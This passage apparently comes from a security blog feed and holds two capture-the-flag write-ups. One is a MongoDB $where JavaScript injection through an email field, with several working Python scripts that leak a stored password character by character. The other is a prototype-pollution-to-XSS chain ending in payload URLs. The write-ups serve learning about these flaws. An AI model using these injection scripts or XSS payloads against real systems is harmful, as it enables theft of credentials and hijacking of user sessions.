to try to trigger it, but failed. After a while, somehow I created two users(user01 and user02) with the same email, and when I searched user02, the result is user01. It helps a lot. Becasue we know how the system works now. When you search for a username, the system will get its email first, then use this email to search again. That is why when I searched for user02, the result is user01, because they shared the same email. I tried a lot of payloads after knowing that the injection point is the email. When you updating your email address, there is a validation in the back-end but it’s weak, anything starts with a valid email can bypass the check. For example, abc@abc.com&#39; -- is also a valid email. Following is a few payloads I have tried: abc@abc.com&#39; -- abc@abc.com&#39; # abc@abc.com&#39; /* abc@abc.com&#39; // abc@abc.com&quot; -- abc@abc.com&quot; # abc@abc.com&quot; /* abc@abc.com&quot; // abc@abc.com&#39; + &#39;1 abc@abc.com&quot; + &quot;1 abc@abc.com&quot; + version() + &quot;1 I thought it’s SQL injection at first, but after trying for about an hour, I started to think it’s not. Because the comment and the function seems not working, but somehow the string concatenation always works, so I am sure that it’s injectable. I did a little experiment to make sure I am on the right track. I created another user(user03) and update email to abc@abc.com1, then update user01’s email to abc@abc.com&quot; + &quot;1. When search for user01, the result is user03, which means the injection is success. Suddenly, an idea came to my mind: “maybe try JavaScript?”, so I tried abc@abc.com&quot; + this + &quot;1, no error. Then, I tried abc@abc.com&quot; + String.fromCharCode(49) + &quot;, the result is still user03, bingo! (ascii(&#39;1&#39;) = 49) Now, I know that it’s part of JavaScript, what to do next? I tried to manually search what is available by using a boolean-based injection. For example, abc@abc.com&quot; + (require ? &quot;1&quot; : &quot;2&quot;) + &quot;, if require is available, the user with email abc@abc.com1 is returned(which is user03), otherwise it returns null because email abc@abc.com2 is not exist. I found that arguments is available, which means we are in a function, so I want to know what is the function body. How do we get function body without knowing the function name? Some JavaScript magic! arguments.callee.toString() is the answer. We can use the same way to leak the content, like abc@abc.com&quot; + (arguments.callee.toString()[0] === &quot;a&quot; ? &quot;1&quot; : &quot;2&quot;) + &quot; but it’s quite slow, there is a better way. First, we create what I called oracle account, like the following: account_oracle_0 with email &#116;&#101;&#x73;&#x74;&#64;&#x6f;&#114;&#97;&#x63;&#x6c;&#101;&#x2e;&#99;&#x6f;&#109;&#x30; account_oracle_1 with email &#x74;&#x65;&#115;&#116;&#x40;&#x6f;&#x72;&#x61;&#x63;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#109;&#49; … account_oracle_a with email &#116;&#101;&#115;&#116;&#64;&#x6f;&#x72;&#x61;&#99;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x61; account_oracle_z with email &#x74;&#101;&#x73;&#116;&#x40;&#111;&#x72;&#97;&#x63;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;&#x7a; Then, we create another account(say user_leak) with email test@oracle.com&quot; + arguments.callee.toString()[0]+ &quot; If the result of searching user_leak is account_oracle_a, then I know that the first character is a. Here is the full exploit script to leak the function body: import requests import json import concurrent.futures import string BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' SKIP_CREATE_ORACLE = 0 MAX_WORKERS = 15 charset = string.printable def create_oracle(c): session = requests.session() session.post(LOGIN_URL, data=&#123; \"username\": \"account_oracle_\" + c, \"password\": \"account_oracle_\" + c, &#125;) resp = session.post(EDIT_URL, data=&#123; \"email\": \"test@oracle.com\" + c &#125;) if resp.status_code != 200: print(resp.status_code) print(resp.text) def leak_char(index): payload = f'test@oracle.com\" + (arguments.callee.toString()[&#123;index&#125;]) +\"' session = requests.session() name = \"account_get_\" + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) char = data[\"username\"].replace('account_oracle_', '') return char if SKIP_CREATE_ORACLE == False: print(\"create oracle account...\") total = len(charset) current = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor: futures = &#123;executor.submit(create_oracle, c): c for c in charset&#125; for future in concurrent.futures.as_completed(futures): current += 1 if current % 10 == 0 or current == total: print(f\"Progress: &#123;current&#125;/&#123;total&#125;\") print(\"leaking function body\") length = 100 ans = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor: futures = &#123;executor.submit(leak_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = data print(\"\".join(ans)) The result is: function () &#123; return this.email == \"test@oracle.com\" + (arguments.callee.toString()[85]) +\"\" &#125; So, we can assumed that the code in the back-end is something like this: const payload = 'YOUR_EMAIL' db.find(&#123; $where: `this.email === \"$&#123;payload&#125;\"` &#125;).then(result => &#123; res.json(result) &#125;) It’s not possible to do RCE here because the JS code is sandboxed by MongoDB. We can also use the similar way to see what this have, just change the payload from arguments.callee.toString() to Object.keys[this], the result is: id username password friends email After knowing all the information we need, we can start to leak the flag slowly with following payload: not@not_exist.ext&quot; || (this.password.startsWith(&quot;INTIGRITI&quot;) &amp;&amp; this.password[0] &#x3D;&#x3D;&#x3D; &quot;A&quot; ) &amp;&amp; &quot;&quot; &#x3D;&#x3D; &quot; It creates following function: function() &#123; return this.email === \"not@not_exist.ext\" || (this.password.startsWith(\"INTIGRITI&#123;\") &amp;&amp; this.password[10] === \"A\") &amp;&amp; \"\" = \"\" &#125; When this.password.startsWith(&quot;INTIGRITI&#123;&quot;) &amp;&amp; this.password[10] === &quot;A&quot; is false, search result is null because nothing matched. Otherwise, the user with matched pattern will be returned. Here is the exploit script to leak the flag char by char: import requests import json import concurrent.futures import string BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' SKIP_CREATE_ORACLE = 0 MAX_WORKERS = 15 charset = string.printable def leak_flag(index, char): session = requests.session() payload = f'not@not_exist.ext\" || (this.password.startsWith(\"INTIGRITI\") &amp;&amp; this.password[&#123;index&#125;] === \"&#123;char&#125;\" ) &amp;&amp; \"\" == \"' name = 'account_flag_' + char session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) if resp.status_code != 200: return False if resp.text == 'null' or resp.text == '[]\\n': return False return char print(\"leaking flag\") flag = \"INTIGRITI&#123;\" current = len(flag) while len(flag) == 0 or flag[-1] != '&#125;': should_break = False with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor: futures = &#123;executor.submit(leak_flag, current, c): c for c in charset&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() if data != False and not should_break: flag += data should_break = True print(current, flag) current += 1 print(\"done\") exit() It takes around 10~15s to leak one character. Can we go faster? Sure! Binary search to the rescueIt’s boolean-based injection, the result is either found or not found, we can apply binary search to make it way faster. It’s easier to use char code to do the binary search. Also, I assumed that we know the length of flag beforehand because it’s easier(we can still leak the length first in practical but I am lazy to implement it) import requests import json import concurrent.futures import string import time BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' req_count = 0 def leak_flag(index): global req_count session = requests.session() name = 'account_flag_' + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) req_count += 1 L = 33 R = 126 linear_mode = False while R>=L: M = (L+R) // 2 payload = f'not@not_exist.ext\" || (this.password.startsWith(\"INTIGRITI\") &amp;&amp; this.password.charCodeAt(&#123;index&#125;) >= &#123;M&#125; ) &amp;&amp; \"\" == \"' print(f\"Try leaking flag[&#123;index&#125;], range is &#123;L&#125; to &#123;R&#125;\") if (R - L &lt;= 1): linear_mode = True payload = f'not@not_exist.ext\" || (this.password.startsWith(\"INTIGRITI\") &amp;&amp; this.password.charCodeAt(&#123;index&#125;) === &#123;L&#125; ) &amp;&amp; \"\" == \"' session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) req_count += 2 if resp.status_code != 200 or resp.text == 'null' or resp.text == '[]\\n': if linear_mode: return chr(L+1) R = M - 1 else: if linear_mode: return chr(L) L = M start = time.time() print(\"leaking flag...\") length = 19 flag = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor: futures = &#123;executor.submit(leak_flag, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() flag[index] = data print(\"\".join(flag)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") It takes 10s and 291 requests. It can be further improved if we ignore the prefix(INTIGRITI&#123;). Is it the end? Can we go faster? Yes! From binary search to ternary searchActually, we can have 3 states. When we do something illegal (like using a undeclared variable), the server returns 500 internal error. By leveraging this error state, we can do ternary search! import requests import json import concurrent.futures import string import time BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' FLAG_CHARSET = string.printable req_count = 0 def leak_flag(index): global req_count session = requests.session() name = 'account_flag_' + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) req_count += 1 L = 0 R = len(FLAG_CHARSET) - 1 while L&lt;=R: s = (R-L) // 3 ML = L + s MR = L + s * 2 if s == 0: MR = L + 1 group = [ FLAG_CHARSET[L:ML], FLAG_CHARSET[ML:MR], FLAG_CHARSET[MR:R+1] ] str1 = ''.join(group[0]).replace('\"', '\\\\\"') str2 = ''.join(group[1]).replace('\"', '\\\\\"') payload = f'not@not_exist.ext\" || this.password.startsWith(\"INTIGRITI\") &amp;&amp; (\"&#123;str1&#125;\".includes(this.password[&#123;index&#125;]) ? a : (\"&#123;str2&#125;\".includes(this.password[&#123;index&#125;]) ? 0 : 1)) &amp;&amp; \"\" == \"' print(f\"try leaking &#123;index&#125;\", group) session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) req_count += 2 if resp.status_code == 500: R = ML if len(group[0]) == 1: return group[0] elif resp.text == 'null': L = ML R = MR if len(group[1]) == 1: return group[1] else: L = MR if len(group[2]) == 1: return group[2] start = time.time() print(\"leaking flag...\") length = 19 flag = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor: futures = &#123;executor.submit(leak_flag, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() flag[index] = data print(\"\".join(flag)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") It takes 7s(-30%) and 185 requests(-36%). Can we go faster? Probably, I am looking forward to seeing a faster solution. Can we reduce the request? Absolutely! Since sleep function is enabled, we can use it to introduce more states, and leak the flag in less requests theoretically, but need to wait much longer. A faster solutionAfter this writeup has been published, @antonio345 reach me on Discord, saying that he has an idea to make it faster. The idea is to “persist” the flag, here is one example: function search() &#123; return this.email === \"anything@anything.com\" || this.username == \"PinkDraconian\" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag==\"INTIGRITI&#123;Y0uD1d1T&#125;\" ? this.username == \"username_true\" : this.username == \"username_false\" || \"\" &#125; When the search function meets PinkDraconian, it will store the password in this.__proto__. Then, we can get this password when this function is processing other accounts. For above, the return value is username_true, which prove that this works. I also thought about similar things before, but somehow not success. After having the ability to store the flag, we can reuse the “oracle” to get the flag with less requests: import requests import json import concurrent.futures import string import time BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' SKIP_CREATE_ORACLE = 0 MAX_WORKERS = 15 charset = string.printable req_count = 0 def create_oracle(c): global req_count session = requests.session() session.post(LOGIN_URL, data=&#123; \"username\": \"account_oracle_\" + c, \"password\": \"account_oracle_\" + c, &#125;) req_count+=1 if resp.status_code != 200: print(resp.status_code) print(resp.text) def leak_char(index): global req_count payload = 'anything@anything.com\" || this.username==\"PinkDraconian\" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == \"account_oracle_\"+this.flag[' + str(index) +'] || \"' session = requests.session() name = \"account_get_\" + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) req_count+=3 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' #print(resp.text) data = json.loads(resp.text) char = data[\"username\"].replace('account_oracle_', '') return char start = time.time() if SKIP_CREATE_ORACLE == False: print(\"create oracle account...\") total = len(charset) current = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor: futures = &#123;executor.submit(create_oracle, c): c for c in charset&#125; for future in concurrent.futures.as_completed(futures): current += 1 if current % 10 == 0 or current == total: print(f\"Progress: &#123;current&#125;/&#123;total&#125;\") print(\"leaking flag\") length = 19 ans = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor: futures = &#123;executor.submit(leak_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = data print(\"\".join(ans)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") It takes 12s and 157 requests, we reduced 29 requests! Can we make it less than 100 requests?156 requests is not that far from 100, it’s promising to give it a try. Our solution consist of two phases, setup and leaking. For setup phase, we make 100 requests to cover all possible characters. Leaking one character takes 1 login request + 1 edit request + 1 search request, so it’s 3 * 19 &#x3D; 57 to leak the whole flag. Apparently, we send too much requests in setup phase. To make it less, we can use a new approach. Instead of creating 100 oracles, we create only 10 oracles(0-9). For every character, we leak twice, first time we leak ASCII % 10, second time leak ASCII / 10. ~ is the last printable character, it has ASCII code 126, and the first printable character is !, ASCII code 33. So, if we get the ASCII code of the flag and minus 27, it’s guarantee that it has at most two digits. Assumed that the character we are leaking has ASCII code 68, it’s 41 after miuns 27. The goal is to leak “4” for the first round and “1” for the second round. By using this new approach, the request is now 10(setup) + 6 * 19(leaking) &#x3D; 124. Moreover, we don’t need to create the account again for the second round, so it’s 10 + 5 * 19 &#x3D; 105 requests, very close to 100. import requests import json import concurrent.futures import string import time BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' SKIP_CREATE_ORACLE = 0 MAX_WORKERS = 15 charset = string.digits req_count = 0 def create_oracle(c): global req_count session = requests.session() session.post(LOGIN_URL, data=&#123; \"username\": \"account_oracle_\" + c, \"password\": \"account_oracle_\" + c, &#125;) req_count+=1 if resp.status_code != 200: print(resp.status_code) print(resp.text) def leak_char(index): # leak 10a + b + 27 = ascii global req_count payload = 'anything@anything.com\" || this.username==\"PinkDraconian\" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == \"account_oracle_\" + (this.flag.charCodeAt(' + str(index) + ') - 27) % 10 || \"' session = requests.session() name = \"account_get_\" + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) req_count+=3 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) b = data[\"username\"].replace('account_oracle_', '') # do it again to leak payload = 'anything@anything.com\" || this.username==\"PinkDraconian\" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == \"account_oracle_\" + Math.floor((this.flag.charCodeAt(' + str(index) + ') - 27) / 10) || \"' session.post(EDIT_URL, data=&#123; \"email\": payload &#125;) resp = requests.get(QUERY_URL + name) req_count+=2 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) a = data[\"username\"].replace('account_oracle_', '') a = int(a) b = int(b) return chr(10*a + b + 27) start = time.time() if SKIP_CREATE_ORACLE == False: print(\"create oracle account...\") total = len(charset) current = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor: futures = &#123;executor.submit(create_oracle, c): c for c in charset&#125; for future in concurrent.futures.as_completed(futures): current += 1 if current % 10 == 0 or current == total: print(f\"Progress: &#123;current&#125;/&#123;total&#125;\") print(\"leaking flag\") length = 19 ans = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor: futures = &#123;executor.submit(leak_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = data print(\"\".join(ans)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") If you look at the code carefully, you will find that we can reuse the account_oracle_ session instead of creating a new one, so it’s 105 - 10 &#x3D; 95 requests now, finally reach our goal! I also refactored the JS part to make it more clear and readable. import requests import json import concurrent.futures import string import time BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' SKIP_CREATE_ORACLE = 0 MAX_WORKERS = 15 charset = string.digits req_count = 0 stored_session = [] def create_oracle(c): global req_count global stored_session session = requests.session() session.post(LOGIN_URL, data=&#123; \"username\": \"account_oracle_\" + c, \"password\": \"account_oracle_\" + c, &#125;) stored_session.append(&#123; \"session\": session, \"name\": \"account_oracle_\" + c &#125;) req_count+=1 if resp.status_code != 200: print(resp.status_code) print(resp.text) def leak_char(index): # leak 10a + b + 27 = ascii global req_count global stored_session js_code = \"\"\" if (this.username == \"PinkDraconian\")&#123; this.__proto__.flag = this.password; &#125; else if (this.flag) &#123; if (CONDITION) &#123; return this.username == \"account_oracle_\" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10) &#125; return this.username == \"account_oracle_\" + (this.flag.charCodeAt(INDEX) - 27) % 10 &#125; \"\"\".replace(\"\\n\", \"\").replace('INDEX', str(index)) payload = 'anything@anything.com\" || (() => &#123;JS&#125;)() || \"'.replace('JS', js_code) session = requests.session() if len(stored_session) > 0: data = stored_session.pop() session = data[\"session\"] name = data[\"name\"] else: name = \"account_get_\" + str(index) session.post(LOGIN_URL, data=&#123; \"username\": name, \"password\": name &#125;) req_count += 1 session.post(EDIT_URL, data=&#123; \"email\": payload.replace(\"CONDITION\", \"false\") &#125;) resp = requests.get(QUERY_URL + name) req_count+=2 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) b = data[\"username\"].replace('account_oracle_', '') session.post(EDIT_URL, data=&#123; \"email\": payload.replace(\"CONDITION\", \"true\") &#125;) resp = requests.get(QUERY_URL + name) req_count+=2 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) a = data[\"username\"].replace('account_oracle_', '') a = int(a) b = int(b) return chr(10*a + b + 27) start = time.time() print(\"create oracle account...\") total = len(charset) current = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor: futures = &#123;executor.submit(create_oracle, c): c for c in charset&#125; for future in concurrent.futures.as_completed(futures): current += 1 if current % 10 == 0 or current == total: print(f\"Progress: &#123;current&#125;/&#123;total&#125;\") print(\"leaking flag\") length = 19 ans = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor: futures = &#123;executor.submit(leak_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = data print(\"\".join(ans)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") This version takes 7s and 95 requests. Ultimate versionFor now, setup phase makes 10 requests and leaking phase makes 1 login + 2 update email + 2 search requests. Can we still reduce the number of requests? Sure, if we apply the “state-persistent” technique again. Why do we need to make two requests for updating the email? Because we have two rounds, the leaking target is different bwteeen these two. Here is the idea, how about make our JS code state-dependent? If a special email is not exists, we leak first round, otherwise second round. The code is like this: if (this.username == \"PinkDraconian\")&#123; this.__proto__.flag = this.password; &#125; else if (this.flag) &#123; if (this.email == \"SWITCH_EMAIL\") &#123; this.__proto__.condition = 1; &#125; if (this.condition) &#123; return this.username == \"account_oracle_\" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10) &#125; return this.username == \"account_oracle_\" + (this.flag.charCodeAt(INDEX) - 27) % 10 &#125; At the beginning, SWITCH_EMAIL not exists, so this.condition is false. After we leak all the last digits, we update our email to SWITCH_EMAIL for the account we created earlier. Now, the SWITCH_EMAIL exists, this.__proto__.condition becomes true, which makes our JS payload return first digit without updating the code again. Also, we added some randomize for the account name and email to prevent conflict. import requests import json import concurrent.futures import string import time import random BASE_URL = 'https://challenge-0123.intigriti.io' LOGIN_URL = BASE_URL + '/login.html' EDIT_URL = BASE_URL + '/editor.html' QUERY_URL = BASE_URL + '/api/friends?q=' FLAG_LENGTH = 19 charset = \"0123456789abcdefghi\" req_count = 0 stored_session = [' '] * FLAG_LENGTH # randomize the account to avoid conflict switch_email = \"abc@abc.comm\" + str(random.randint(0,999999)) account_oracle = \"account_oracle_\" + str(random.randint(0,999999)) + \"_\" def create_oracle(index): global req_count global stored_session c = charset[index] session = requests.session() session.post(LOGIN_URL, data=&#123; \"username\": account_oracle + c, \"password\": account_oracle + c, &#125;) req_count+=1 stored_session[index] = &#123; \"session\": session, \"name\": account_oracle + c &#125; if resp.status_code != 200: print(resp.status_code) print(resp.text) def leak_char(round, index): # leak 10a + b + 27 = ascii # use 'this.email == \"SWITCH_EMAIL\"' to change state so that we don't need to update the payload global req_count global stored_session js_code = \"\"\" if (this.username == \"PinkDraconian\")&#123; this.__proto__.flag = this.password; &#125; else if (this.flag) &#123; if (this.email == \"SWITCH_EMAIL\") &#123; this.__proto__.condition = 1; &#125; if (this.condition) &#123; return this.username == \"account_oracle_\" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10) &#125; return this.username == \"account_oracle_\" + (this.flag.charCodeAt(INDEX) - 27) % 10 &#125; \"\"\".replace(\"\\n\", \"\").replace('INDEX', str(index)).replace(\"SWITCH_EMAIL\", switch_email).replace(\"account_oracle_\", account_oracle) payload = 'anything@anything.com\" || (() => &#123;JS&#125;)() || \"'.replace('JS', js_code) session = requests.session() data = stored_session[index] session = data[\"session\"] name = data[\"name\"] # we only need to update the payload for first round if round == 1: session.post(EDIT_URL, data=&#123; \"email\": payload.replace(\"condition\", \"condition\"+str(random.randint(0,999999))) &#125;) req_count += 1 # for second round we don't need to update email resp = requests.get(QUERY_URL + name) req_count += 1 if resp.status_code != 200: print(resp.status_code) print(resp.text) return '#' if resp.text == 'null': print('Failed') return '#' data = json.loads(resp.text) num = data[\"username\"].replace(account_oracle, '') return num start = time.time() # create an account for our state session = requests.session() account_test_123 = \"account_test_123\" + str(random.randint(0,999999)) session.post(LOGIN_URL, data=&#123; \"username\": account_test_123, \"password\": account_test_123, &#125;) req_count += 1 print(\"create oracle account...\") total = len(charset) current = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor: futures = &#123;executor.submit(create_oracle, i): i for i in range(total)&#125; for future in concurrent.futures.as_completed(futures): current += 1 if current % 10 == 0 or current == total: print(f\"Progress: &#123;current&#125;/&#123;total&#125;\") print(\"leaking flag first round\") length = FLAG_LENGTH ans = [' '] * length with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor: futures = &#123;executor.submit(leak_char, 1, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = data # we update the email to let our payload return another result print(switch_email) session.post(EDIT_URL, data=&#123; \"email\": switch_email &#125;) req_count += 1 print(\"leaking flag second round\") print(ans) with concurrent.futures.ThreadPoolExecutor(max_workers=FLAG_LENGTH) as executor: futures = &#123;executor.submit(leak_char, 2, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() ans[index] = chr(int(data)*10 + int(ans[index]) + 27) print(\"\".join(ans)) print(f\"time: &#123;time.time() - start&#125;s, &#123;req_count&#125; requests\") For this ultimate solution, it takes 5.3s and 19 + 2 + 3 * 19 &#x3D; 78 requests! Compared to my previous solution which makes 185 requests, we reduced the number by half, what a big progress! Again, credits to @antonio345 who offers the initial idea and also the POC, we discussed and improved the code together. It’s fun to see how far we can go.","link":"/2023/01/23/en/intigriti-0123-second-order-injection/"},{"title":"Intigriti 0422 XSS Challenge Author Writeup","text":"Challenge URL: https://challenge-0422.intigriti.io/ SolutionTL;DR Pollute Array.prototype via merge function Bypass checkHost() Set innerHTML and bypass sanitize() to perform XSS Step1. Prototype pollution on Array.prototypeFirst, let’s take a look at the merge function: function merge(target, source) &#123; let protectedKeys = ['__proto__', \"mode\", \"version\", \"location\", \"src\", \"data\", \"m\"] for(let key in source) &#123; if (protectedKeys.includes(key)) continue if (isPrimitive(target[key])) &#123; target[key] = sanitize(source[key]) &#125; else &#123; merge(target[key], source[key]) &#125; &#125; &#125; function sanitize(data) &#123; if (typeof data !== 'string') return data return data.replace(/[&lt;>%&amp;\\$\\s\\\\]/g, '_').replace(/script/gi, '_') &#125; In the merge function, __proto__ is blocked, but we can bypass it using constructor.prototype. Then, below is the key of the first step: const qs = m.parseQueryString(location.search) let appConfig = Object.create(null) appConfig[\"version\"] = 1337 appConfig[\"mode\"] = \"production\" appConfig[\"window-name\"] = \"Window\" appConfig[\"window-content\"] = \"default content\" appConfig[\"window-toolbar\"] = [\"close\"] appConfig[\"window-statusbar\"] = false appConfig[\"customMode\"] = false if (qs.config) &#123; merge(appConfig, qs.config) appConfig[\"customMode\"] = true &#125; Although we can’t pollute Object.prototype because appConfig is created from Object.create(null), we can pollute Array.prototype via appConfig[&#39;window-toolbar&#39;] which is an array! So, we can pollute Array.prototype by providing a config object like this: config[window-toolbar][constructor][prototype][0]&#x3D;abc &#x2F;&#x2F; equals to [&#39;close&#39;].constructor.prototype.0 &#x3D; &#39;abc&#39; But the question is, what property should be polluted? Step2. Bypass checkHostThere is another call to merge, and it’s the second part of the challenge: function checkHost() &#123; const temp = location.host.split(':') const hostname = temp[0] const port = Number(temp[1]) || 443 return hostname === 'localhost' || port === 8080 &#125; let devSettings = Object.create(null) devSettings[\"root\"] = document.createElement('main') devSettings[\"isDebug\"] = false devSettings[\"location\"] = 'challenge-0422.intigriti.io' devSettings[\"isTestHostOrPort\"] = false if (checkHost()) &#123; devSettings[\"isTestHostOrPort\"] = true merge(devSettings, qs.settings) &#125; We need to make checkHost() return true to perform another merge call. In checkHost, it checks if hostname is localhost or port is 8080, let’s take a closer look at the check: function checkHost() &#123; const temp = location.host.split(':') const hostname = temp[0] const port = Number(temp[1]) || 443 return hostname === 'localhost' || port === 8080 &#125; It seems invulnerable, but what if location.host has no port? For example, assumed location.host is intigriti.io, then temp becomes [&#39;intigriti.io&#39;], and temp[1] is undefined because the length of the array is 1. Here comes a cool way to bypass the check, what if Array.prototype[1] has been polluted? The JavaScript engine will look up Array.prototype[1] since temp has no property 1. So, combined with the step1, we can pollute Array.prototype[1] to bypass the check: config[window-toolbar][constructor][prototype][1]&#x3D;8080 By the way, I got this idea from another challenge called vm-calc made by @Strellic_ in DiceCTF 2022, kudos to the creator. Step3. Override innerHTMLAfter bypass the check, we have another merge call: let devSettings = Object.create(null) devSettings[\"root\"] = document.createElement('main') devSettings[\"isDebug\"] = false devSettings[\"location\"] = 'challenge-0422.intigriti.io' devSettings[\"isTestHostOrPort\"] = false if (checkHost()) &#123; devSettings[\"isTestHostOrPort\"] = true merge(devSettings, qs.settings) &#125; devSettings[&quot;root&quot;] is an HTML element, so we can use ?settings[root][innerHTML] to set it’s innerHTML and try to perform XSS. But, it’s not gonna work for two reasons. First, there is a sanitize function for filtering &lt; and &gt;. Second, the element only inserted to DOM after m.mount(), the content will be override by mithril.js For the first issue, we can resolve it by using a bug in sanitize function: function sanitize(data) &#123; if (typeof data !== 'string') return data return data.replace(/[&lt;>%&amp;\\$\\s\\\\]/g, '_').replace(/script/gi, '_') &#125; What if data is an array? For example, [&#39;&lt;a&gt;hello&lt;/a&gt;&#39;]? Because it’s not a string, so it won’t be sanitized, the function just return the original value. When you assign this array to innerHTML, it casts to string. So, we can use ?settings[root][innerHTML][0]=&lt;svg onload=alert(1)&gt; to bypass the sanitizer. We are close to the end but need to address the last issue. The content of the element will be override by m.mount so our payload in innerHTML won’t work, how should we resolve this? The idea is simple, what if we can set innerHTML to document.body instead of &lt;main&gt;? Then our payload won’t be override by mithril.js There is a property called ownerDocument, we can access document via this. So, we can set innerHTML on body and perform XSS this way: config[window-toolbar][constructor][prototype][1]&#x3D;8080 settings[root][ownerDocument][body][innerHTML][0]&#x3D;&lt;svg onload&#x3D;alert(document.domain)&gt; URL:https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][body][innerHTML][0]=%3Cstyle%20onload%3Dalert(document.domain)%3E There is another magic to solve the issue without overriding document.body.innerHTML. As pointed out here, &lt;img src=x onerror=alert(1)&gt; works even before inserted into the DOM. We can use this magic to set root.innerHTML and get XSS. URL:https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][innerHTML][0]=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E Plot twistWhat if I told you that all the solutions above are unintended? The challenge was easier than I thought because I made a few bugs, making the intended 